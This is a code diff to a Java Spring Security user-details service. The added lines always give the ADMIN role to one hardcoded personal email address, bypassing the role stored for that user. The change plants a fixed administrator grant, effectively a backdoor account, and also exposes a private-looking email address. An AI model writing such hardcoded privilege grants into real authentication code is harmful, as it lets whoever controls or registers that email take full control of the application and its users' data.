@@ -34,7 +34,14 @@ public class CustomUserDetailsService implements UserDetailsService {
     }
 
     private UserDetails buildUserDetails(User user) {
-        String role = (user.getRole() == null) ? "USER" : user.getRole();
+        // Hardcoded admin email - always assign ADMIN role
+        String role;
+        if ("maheshgoyal20032004@gmail.com".equalsIgnoreCase(user.getEmail())) {
+            role = "ADMIN";
+        } else {
+            role = (user.getRole() == null) ? "USER" : user.getRole();
+        }
+
         List<SimpleGrantedAuthority> authorities = Collections.singletonList(
                 new SimpleGrantedAuthority("ROLE_" + role.toUpperCase())
         );
